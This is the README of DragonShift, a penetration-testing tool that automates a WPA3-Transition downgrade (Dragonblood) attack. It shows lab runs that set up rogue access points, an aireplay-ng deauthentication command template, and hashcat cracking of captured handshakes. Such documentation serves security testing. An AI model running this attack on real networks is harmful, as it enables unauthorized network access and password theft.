# DragonShift
This tool automates the execution of a WPA3-Transition Mode downgrade attack, specifically leveraging the Dragonblood vulnerability. In WPA3-Transition Mode, networks are configured to support both WPA2 and WPA3 connections to maintain compatibility with older devices. However, this feature can be exploited to create a rogue access point (AP) that mimics a legitimate network.

The attack works by luring clients to connect to the rogue AP using the less secure WPA2 protocol. Once a client connects, the tool captures the WPA2 handshake, which can then be subjected to offline cracking attempts to retrieve the network's passphrase.

This tool is intended for use by security researchers and penetration testers to demonstrate the risks associated with WPA3-Transition Mode and to help network administrators identify and mitigate such vulnerabilities.

**IMPORTANT**:
This script has primarily been tested in lab environments, specifically on the following setup: [WiFiChallengeLab-docker](https://github.com/r4ulcl/WiFiChallengeLab-docker). When run on production infrastructure, **the script should have no impact**, as its purpose is to scan, detect and wait for a client to connect to the rogue AP created by the script to capture the handshake. However, please be aware that errors may still occur.

**Note**: This tool is for educational and authorized testing purposes only. Unauthorized use is illegal and unethical.

# Required Tools

- python3
- ip
- iw
- iwconfig
- Aircrack-ng suite, includes:
  - airodump-ng
  - airmon-ng
- hostapd-mana

# Usage
For optimal use of DragonShift, it is **highly recommended to have two Wi-Fi interfaces** :
- One dedicated to scanning and performing deauthentication attacks if an AP is vulnerable.
- The other for creating a rogue AP in order to push a station/client to authenticate with the WPA2 protocol on our freshly created AP.

If the script is launched with a single interface (in monitor mode), it will operate in passive mode, waiting for clients to connect to the rogue AP to intercept the handshake. However, if the script is launched with two interfaces (one in monitor mode and the other in managed mode), the user can initiate deauthentication attacks from a second terminal when prompted by the script, thereby speeding up the handshake capture process.
```
# python3 dragonshift.py --help
 
▓█████▄  ██▀███   ▄▄▄        ▄████  ▒█████   ███▄    █   ██████  ██░ ██  ██▓  █████▒▄▄▄█████▓
▒██▀ ██▌▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▓██▒▓██   ▒ ▓  ██▒ ▓▒
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██▒▒████ ░ ▒ ▓██░ ▒░
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░██░░▒█░      ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒ ░      ▒ ░░   
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░          ░    
 ░ ░  ░   ░░   ░   ░   ▒   ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░  ░░ ░ ▒ ░ ░ ░      ░      
   ░       ░           ░  ░      ░     ░ ░           ░       ░   ░  ░  ░ ░                   
 ░                                                                                           

DragonShift v1 - WPA3-Transition Downgrade Attack Tool
Copyright (c) 2024, Akerva, CHAABT Moussa
    
usage: dragonshift.py [-h] -m MONITOR_INTERFACE [-r ROGUEAP_INTERFACE]

Automated WPA3-Transition Downgrade Attack Tool (Dragonblood).

options:
  -h, --help            show this help message and exit
  -m MONITOR_INTERFACE, --monitor MONITOR_INTERFACE
                        Interface to use in monitor mode.
  -r ROGUEAP_INTERFACE, --rogue ROGUEAP_INTERFACE
                        Interface to use for Rogue AP during hostapd-mana launch.

```
# DragonShift Scenarios
The script can manage various attack scenarios, but in general, the steps for each scenario are as follows:
- Creates a working directory.
- Scan vulnerable APs.
- If no vulnerable APs are found, the script will terminate.
- Scan stations for each vulnerable AP.
- Create hostapd-mana configuration file for each vulnerable AP containing at least one connected station.
- If no stations are detected, the script skips the creation of a hostapd-mana and proceeds to the next one.
- Creates a rogue AP for each previously created configuration file.
- Waits for a station to connect to the rogue AP to capture the handshake (If two interfaces are provided, the script instructs the user to launch a deauthentication attack in a second terminal.).
- If the handshake is successfully captured, the script moves on to the next rogue AP continuing this process until all configuration files have been processed.
- For each captured handshake, it is saved in the scan folder, and the script provides the user with the hashcat command required to crack the PSK.
## No vulnerable APs
```
# python3 dragonshift.py -m wlan0mon
 
▓█████▄  ██▀███   ▄▄▄        ▄████  ▒█████   ███▄    █   ██████  ██░ ██  ██▓  █████▒▄▄▄█████▓
▒██▀ ██▌▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▓██▒▓██   ▒ ▓  ██▒ ▓▒
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██▒▒████ ░ ▒ ▓██░ ▒░
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░██░░▒█░      ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒ ░      ▒ ░░   
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░          ░    
 ░ ░  ░   ░░   ░   ░   ▒   ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░  ░░ ░ ▒ ░ ░ ░      ░      
   ░       ░           ░  ░      ░     ░ ░           ░       ░   ░  ░  ░ ░                   
 ░                                                                                           

DragonShift v1 - WPA3-Transition Downgrade Attack Tool
Copyright (c) 2024, Akerva, CHAABT Moussa
    
[!] WARNING : Only the monitor mode interface has been provided.
The script will run in passive mode, meaning you won't be able to manually force stations to reconnect to the rogue AP. For better handshake capture, it's STRONGLY RECOMMENDED to use two interfaces: one in monitor mode for scanning and manual deauthentication, and another in managed mode to launch the rogue AP.
[!] Would you like to continue ? (y/n) y
[+] All required tools are present.
[+] The wlan0mon interface is in monitor mode. Starting Airodump-ng.
[+] Airodump-ng is running on interface wlan0mon for 1 minute...
[+] Capture done. Files are saved under 'scan-2024-08-24-22-39/discovery'.
[+] Parsing PCAP file: scan-2024-08-24-22-39/discovery-01.cap
[+] No vulnerable APs were found in the file. Exiting program.
```
## Single interface - Multiple APs
```
# root@WiFiChallengeLab:~/wifi/script# python3 dragon.py -m wlan0mon
 
▓█████▄  ██▀███   ▄▄▄        ▄████  ▒█████   ███▄    █   ██████  ██░ ██  ██▓  █████▒▄▄▄█████▓
▒██▀ ██▌▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▓██▒▓██   ▒ ▓  ██▒ ▓▒
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██▒▒████ ░ ▒ ▓██░ ▒░
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░██░░▒█░      ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒ ░      ▒ ░░   
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░          ░    
 ░ ░  ░   ░░   ░   ░   ▒   ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░  ░░ ░ ▒ ░ ░ ░      ░      
   ░       ░           ░  ░      ░     ░ ░           ░       ░   ░  ░  ░ ░                   
 ░                                                                                           

DragonShift v1 - WPA3-Transition Downgrade Attack Tool
Copyright (c) 2024, Akerva, CHAABT Moussa
    
[!] WARNING : Only the monitor mode interface has been provided.
The script will run in passive mode, meaning you won't be able to manually force stations to reconnect to the rogue AP. For better handshake capture, it's STRONGLY RECOMMENDED to use two interfaces: one in monitor mode for scanning and manual deauthentication, and another in managed mode to launch the rogue AP.
[!] Would you like to continue ? (y/n) y
[+] All required tools are present.
[+] The wlan0mon interface is in monitor mode. Starting Airodump-ng.
[+] Airodump-ng is running on interface wlan0mon for 1 minute...
[+] Capture done. Files are saved under 'scan-2024-08-24-18-44/discovery'.
[+] Parsing PCAP file: scan-2024-08-24-18-44/discovery-01.cap

[AP VULNERABLE TO DRAGONBLOOD] :
  - SSID: wifi-VULN
  - BSSID: f0:9f:c2:1a:ca:80
  - Channel: 10
  - Security Protocol: WPA3
  - Cipher: CCMP
  - Authentication: PSK, SAE
  - MFP: Inactive


[AP VULNERABLE TO DRAGONBLOOD] :
  - SSID: wifi-IT
  - BSSID: f0:9f:c2:1a:ca:25
  - Channel: 11
  - Security Protocol: WPA3
  - Cipher: CCMP
  - Authentication: PSK, SAE
  - MFP: Inactive


[+] Starting airodump-ng on wifi-VULN (f0:9f:c2:1a:ca:80) with channel 10 for 30 seconds...
[+] Capture done for wifi-VULN. CSV files are saved under : scan-2024-08-24-18-44/wifi-VULN-station.csv

[+] Connected stations on wifi-VULN:
  - Station MAC: 02:00:00:00:05:00

[+] Starting airodump-ng on wifi-IT (f0:9f:c2:1a:ca:25) with channel 11 for 30 seconds...
[+] Capture done for wifi-IT. CSV files are saved under : scan-2024-08-24-18-44/wifi-IT-station.csv

[+] Connected stations on wifi-IT:
  - Station MAC: A2:F0:D4:D9:0D:97
  - Station MAC: 10:F9:6F:AC:53:53
  - Station MAC: 10:F9:6F:AC:53:52

[+] The wlan0 interface is now in Managed mode.
[+] Hostapd configuration file created: /root/wifi/script/scan-2024-08-24-18-44/wifi-VULN-sae.conf
[+] Hostapd configuration file created: /root/wifi/script/scan-2024-08-24-18-44/wifi-IT-sae.conf
[!] Stations are connected. Would you like to start the attack? (y/n) y

[+] Starting Rogue AP with hostapd-mana...
[!] DragonShift is now in passive mode, waiting for stations to connect on our rogue AP...

Configuration file: /root/wifi/script/scan-2024-08-24-18-44/wifi-VULN-sae.conf
MANA: Captured WPA/2 handshakes will be written to file '/root/wifi/script/scan-2024-08-24-18-44/wifi-VULN-handshake.hccapx'.
Using interface wlan0 with hwaddr 02:00:00:00:00:00 and ssid "wifi-VULN"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
wlan0: STA 02:00:00:00:05:00 IEEE 802.11: authenticated
wlan0: STA 02:00:00:00:05:00 IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 02:00:00:00:05:00

[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).
[+] Run hashcat using mode 2500 to crack the handshake
[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force

[+] Starting Rogue AP with hostapd-mana...
[!] DragonShift is now in passive mode, waiting for stations to connect on our rogue AP...

Configuration file: /root/wifi/script/scan-2024-08-24-18-44/wifi-IT-sae.conf
MANA: Captured WPA/2 handshakes will be written to file '/root/wifi/script/scan-2024-08-24-18-44/wifi-IT-handshake.hccapx'.
Using interface wlan0 with hwaddr 02:00:00:00:00:00 and ssid "wifi-IT"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
wlan0: STA 10:f9:6f:ac:53:52 IEEE 802.11: authenticated
wlan0: STA 10:f9:6f:ac:53:52 IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 10:f9:6f:ac:53:52

[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).
[+] Run hashcat using mode 2500 to crack the handshake
[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force
```
## Single interface - One AP

```
# root@WiFiChallengeLab:~/wifi/script# python3 dragon.py -m wlan0mon
 
▓█████▄  ██▀███   ▄▄▄        ▄████  ▒█████   ███▄    █   ██████  ██░ ██  ██▓  █████▒▄▄▄█████▓
▒██▀ ██▌▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▓██▒▓██   ▒ ▓  ██▒ ▓▒
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██▒▒████ ░ ▒ ▓██░ ▒░
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░██░░▒█░      ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒ ░      ▒ ░░   
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░          ░    
 ░ ░  ░   ░░   ░   ░   ▒   ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░  ░░ ░ ▒ ░ ░ ░      ░      
   ░       ░           ░  ░      ░     ░ ░           ░       ░   ░  ░  ░ ░                   
 ░                                                                                           

DragonShift v1 - WPA3-Transition Downgrade Attack Tool
Copyright (c) 2024, Akerva, CHAABT Moussa
    
[!] WARNING : Only the monitor mode interface has been provided.
The script will run in passive mode, meaning you won't be able to manually force stations to reconnect to the rogue AP. For better handshake capture, it's STRONGLY RECOMMENDED to use two interfaces: one in monitor mode for scanning and manual deauthentication, and another in managed mode to launch the rogue AP.
[!] Would you like to continue ? (y/n) y
[+] All required tools are present.
[+] The wlan0mon interface is in monitor mode. Starting Airodump-ng.
[+] Airodump-ng is running on interface wlan0mon for 1 minute...
[+] Capture done. Files are saved under 'scan-2024-08-24-18-49/discovery'.
[+] Parsing PCAP file: scan-2024-08-24-18-49/discovery-01.cap

[AP VULNERABLE TO DRAGONBLOOD] :
  - SSID: wifi-IT
  - BSSID: f0:9f:c2:1a:ca:25
  - Channel: 11
  - Security Protocol: WPA3
  - Cipher: CCMP
  - Authentication: PSK, SAE
  - MFP: Inactive


[+] Starting airodump-ng on wifi-IT (f0:9f:c2:1a:ca:25) with channel 11 for 30 seconds...
[+] Capture done for wifi-IT. CSV files are saved under : scan-2024-08-24-18-49/wifi-IT-station.csv

[+] Connected stations on wifi-IT:
  - Station MAC: 10:F9:6F:AC:53:52
  - Station MAC: 10:F9:6F:AC:53:53
  - Station MAC: A2:F0:D4:D9:0D:97

[+] The wlan0 interface is now in Managed mode.
[+] Hostapd configuration file created: /root/wifi/script/scan-2024-08-24-18-49/wifi-IT-sae.conf
[!] Stations are connected. Would you like to start the attack? (y/n) y

[+] Starting Rogue AP with hostapd-mana...
[!] DragonShift is now in passive mode, waiting for stations to connect on our rogue AP...

Configuration file: /root/wifi/script/scan-2024-08-24-18-49/wifi-IT-sae.conf
MANA: Captured WPA/2 handshakes will be written to file '/root/wifi/script/scan-2024-08-24-18-49/wifi-IT-handshake.hccapx'.
Using interface wlan0 with hwaddr 02:00:00:00:00:00 and ssid "wifi-IT"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
wlan0: STA 10:f9:6f:ac:53:52 IEEE 802.11: authenticated
wlan0: STA 10:f9:6f:ac:53:52 IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 10:f9:6f:ac:53:52

[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).
[+] Run hashcat using mode 2500 to crack the handshake
[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force
```
## Multiple interfaces - Multiple APs

```
# root@WiFiChallengeLab:~/wifi/script# python3 dragon.py -m wlan0mon -r wlan1
 
▓█████▄  ██▀███   ▄▄▄        ▄████  ▒█████   ███▄    █   ██████  ██░ ██  ██▓  █████▒▄▄▄█████▓
▒██▀ ██▌▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▓██▒▓██   ▒ ▓  ██▒ ▓▒
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██▒▒████ ░ ▒ ▓██░ ▒░
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░██░░▒█░      ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒ ░      ▒ ░░   
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░          ░    
 ░ ░  ░   ░░   ░   ░   ▒   ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░  ░░ ░ ▒ ░ ░ ░      ░      
   ░       ░           ░  ░      ░     ░ ░           ░       ░   ░  ░  ░ ░                   
 ░                                                                                           

DragonShift v1 - WPA3-Transition Downgrade Attack Tool
Copyright (c) 2024, Akerva, CHAABT Moussa
    
[+] All required tools are present.
[+] The wlan0mon interface is in monitor mode. Starting Airodump-ng.
[+] Airodump-ng is running on interface wlan0mon for 1 minute...
[+] Capture done. Files are saved under 'scan-2024-08-24-18-57/discovery'.
[+] Parsing PCAP file: scan-2024-08-24-18-57/discovery-01.cap

[AP VULNERABLE TO DRAGONBLOOD] :
  - SSID: wifi-IT
  - BSSID: f0:9f:c2:1a:ca:25
  - Channel: 11
  - Security Protocol: WPA3
  - Cipher: CCMP
  - Authentication: PSK, SAE
  - MFP: Inactive


[AP VULNERABLE TO DRAGONBLOOD] :
  - SSID: wifi-VULN
  - BSSID: f0:9f:c2:1a:ca:80
  - Channel: 10
  - Security Protocol: WPA3
  - Cipher: CCMP
  - Authentication: PSK, SAE
  - MFP: Inactive


[+] Starting airodump-ng on wifi-IT (f0:9f:c2:1a:ca:25) with channel 11 for 30 seconds...
[+] Capture done for wifi-IT. CSV files are saved under : scan-2024-08-24-18-57/wifi-IT-station.csv

[+] Connected stations on wifi-IT:
  - Station MAC: 10:F9:6F:AC:53:52
  - Station MAC: A2:F0:D4:D9:0D:97
  - Station MAC: 10:F9:6F:AC:53:53

[+] Starting airodump-ng on wifi-VULN (f0:9f:c2:1a:ca:80) with channel 10 for 30 seconds...
[+] Capture done for wifi-VULN. CSV files are saved under : scan-2024-08-24-18-57/wifi-VULN-station.csv

[+] Connected stations on wifi-VULN:
  - Station MAC: 02:00:00:00:05:00
[+] Hostapd configuration file created: /root/wifi/script/scan-2024-08-24-18-57/wifi-IT-sae.conf
[+] Hostapd configuration file created: /root/wifi/script/scan-2024-08-24-18-57/wifi-VULN-sae.conf
[!] Stations are connected. Would you like to start the attack? (y/n) y
[!] Invalid input. Please enter 'y' to start the attack or 'n' to abort.
[!] Stations are connected. Would you like to start the attack? (y/n) y

[+] Starting Rogue AP with hostapd-mana...
[+] Open a new terminal and run a deauth attack against the vulnerable AP and the connected client
[!] For deauth attack, you can use aireplay-ng like this : aireplay-ng <MONITOR INTERFACE> -0 5 -a <AP BSSID> -c <STATION MAC>

Configuration file: /root/wifi/script/scan-2024-08-24-18-57/wifi-IT-sae.conf
MANA: Captured WPA/2 handshakes will be written to file '/root/wifi/script/scan-2024-08-24-18-57/wifi-IT-handshake.hccapx'.
Using interface wlan1 with hwaddr 42:00:00:00:01:00 and ssid "wifi-IT"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
wlan1: STA 10:f9:6f:ac:53:52 IEEE 802.11: authenticated
wlan1: STA 10:f9:6f:ac:53:52 IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 10:f9:6f:ac:53:52

[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).
[+] Run hashcat using mode 2500 to crack the handshake
[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force

[+] Starting Rogue AP with hostapd-mana...
[+] Open a new terminal and run a deauth attack against the vulnerable AP and the connected client
[!] For deauth attack, you can use aireplay-ng like this : aireplay-ng <MONITOR INTERFACE> -0 5 -a <AP BSSID> -c <STATION MAC>

Configuration file: /root/wifi/script/scan-2024-08-24-18-57/wifi-VULN-sae.conf
MANA: Captured WPA/2 handshakes will be written to file '/root/wifi/script/scan-2024-08-24-18-57/wifi-VULN-handshake.hccapx'.
Using interface wlan1 with hwaddr 42:00:00:00:01:00 and ssid "wifi-VULN"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
wlan1: STA 02:00:00:00:05:00 IEEE 802.11: authenticated
wlan1: STA 02:00:00:00:05:00 IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 02:00:00:00:05:00

[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).
[+] Run hashcat using mode 2500 to crack the handshake
[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force
```
## Multiple interfaces - One AP
```
# root@WiFiChallengeLab:~/wifi/script# python3 dragon.py -m wlan0mon -r wlan1
 
▓█████▄  ██▀███   ▄▄▄        ▄████  ▒█████   ███▄    █   ██████  ██░ ██  ██▓  █████▒▄▄▄█████▓
▒██▀ ██▌▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▓██▒▓██   ▒ ▓  ██▒ ▓▒
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██▒▒████ ░ ▒ ▓██░ ▒░
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░██░░▒█░      ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒ ░      ▒ ░░   
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░          ░    
 ░ ░  ░   ░░   ░   ░   ▒   ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░  ░░ ░ ▒ ░ ░ ░      ░      
   ░       ░           ░  ░      ░     ░ ░           ░       ░   ░  ░  ░ ░                   
 ░                                                                                           

DragonShift v1 - WPA3-Transition Downgrade Attack Tool
Copyright (c) 2024, Akerva, CHAABT Moussa
    
[+] All required tools are present.
[+] The wlan0mon interface is in monitor mode. Starting Airodump-ng.
[+] Airodump-ng is running on interface wlan0mon for 1 minute...
[+] Capture done. Files are saved under 'scan-2024-08-24-18-53/discovery'.
[+] Parsing PCAP file: scan-2024-08-24-18-53/discovery-01.cap

[AP VULNERABLE TO DRAGONBLOOD] :
  - SSID: wifi-IT
  - BSSID: f0:9f:c2:1a:ca:25
  - Channel: 11
  - Security Protocol: WPA3
  - Cipher: CCMP
  - Authentication: PSK, SAE
  - MFP: Inactive


[+] Starting airodump-ng on wifi-IT (f0:9f:c2:1a:ca:25) with channel 11 for 30 seconds...
[+] Capture done for wifi-IT. CSV files are saved under : scan-2024-08-24-18-53/wifi-IT-station.csv

[+] Connected stations on wifi-IT:
  - Station MAC: 10:F9:6F:AC:53:52
  - Station MAC: A2:F0:D4:D9:0D:97
  - Station MAC: 10:F9:6F:AC:53:53
[+] Hostapd configuration file created: /root/wifi/script/scan-2024-08-24-18-53/wifi-IT-sae.conf
[!] Stations are connected. Would you like to start the attack? (y/n) y

[+] Starting Rogue AP with hostapd-mana...
[+] Open a new terminal and run a deauth attack against the vulnerable AP and the connected client
[!] For deauth attack, you can use aireplay-ng like this : aireplay-ng <MONITOR INTERFACE> -0 5 -a <AP BSSID> -c <STATION MAC>

Configuration file: /root/wifi/script/scan-2024-08-24-18-53/wifi-IT-sae.conf
MANA: Captured WPA/2 handshakes will be written to file '/root/wifi/script/scan-2024-08-24-18-53/wifi-IT-handshake.hccapx'.
Using interface wlan1 with hwaddr 42:00:00:00:01:00 and ssid "wifi-IT"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
wlan1: STA 10:f9:6f:ac:53:52 IEEE 802.11: authenticated
wlan1: STA 10:f9:6f:ac:53:52 IEEE 802.11: associated (aid 1)
MANA: Captured a WPA/2 handshake from: 10:f9:6f:ac:53:52

[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).
[+] Run hashcat using mode 2500 to crack the handshake
[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force
```
# Cracking Hashes with Hashcat
```
# root@WiFiChallengeLab:~/wifi/script/scan-2024-08-24-18-57# hashcat -a 0 -m 2500 wifi-VULN-handshake.hccapx ~/rockyou-top100000.txt --force
hashcat (v6.0.0) starting...

....

Dictionary cache hit:
* Filename..: /root/rockyou-top100000.txt
* Passwords.: 1000000
* Bytes.....: 8583863
* Keyspace..: 1000000

420000000100:020000000500:wifi-VULN:iloveyou     
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-EAPOL-PBKDF2
Hash.Target......: wifi-VULN (AP:42:00:00:00:01:00 STA:02:00:00:00:05:00)

....

root@WiFiChallengeLab:~/wifi/script/scan-2024-08-24-18-57# hashcat -a 0 -m 2500 wifi-IT-handshake.hccapx ~/rockyou-top100000.txt --force
hashcat (v6.0.0) starting...

....

Dictionary cache hit:
* Filename..: /root/rockyou-top100000.txt
* Passwords.: 1000000
* Bytes.....: 8583863
* Keyspace..: 1000000

420000000100:10f96fac5352:wifi-IT:bubblegum      
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-EAPOL-PBKDF2
Hash.Target......: wifi-IT (AP:42:00:00:00:01:00 STA:10:f9:6f:ac:53:52)

....
```
# Caution
- If only a monitor mode interface is provided for DragonShift to deploy rogue APs and capture handshakes, the script will eventually switch this interface to managed mode informing the user with the following message :

See [Single interface - Multiple APs](#single-interface---multiple-aps) and [Single interface - One AP](#single-interface---one-ap)

```[+] The <INTERFACE NAME> interface is now in Managed mode.```

# Common Problems
- When displaying APs vulnerable to DragonBlood, it is possible that the channel may not be reported or may be shown as Null or None. In such cases, the script should be re-run.
```
[AP VULNERABLE TO DRAGONBLOOD] :
  - SSID: wifi-IT
  - BSSID: f0:9f:c2:1a:ca:25
  - Channel: None
  - Security Protocol: WPA3
  - Cipher: CCMP
  - Authentication: PSK, SAE
  - MFP: Inactive
```
- When the script executes a command, the return error may be None. If this occurs, the script should be re-run.
```
[-] Attack failed with return code : None
```